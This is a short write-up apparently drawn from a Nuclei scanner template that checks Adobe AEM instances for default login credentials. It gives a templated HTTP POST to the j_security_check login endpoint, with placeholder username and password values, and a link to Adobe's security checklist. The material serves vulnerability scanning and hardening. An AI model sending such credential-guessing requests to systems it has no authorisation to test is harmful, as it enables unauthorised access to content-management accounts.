# Nuclei Template: Adobe AEM Default Login
**Template ID:** aem-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`aem-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Adobe AEM default login credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
POST /libs/granite/core/content/login.html/j_security_check HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: {{BaseURL}}
Referer: {{BaseURL}}/libs/granite/core/content/login.html

_charset_=utf-8&j_username={{aem_user}}&j_password={{aem_pass}}&j_validate=true
```

## References
- https://experienceleague.adobe.com/docs/experience-manager-64/administering/security/security-checklist.html?lang=en
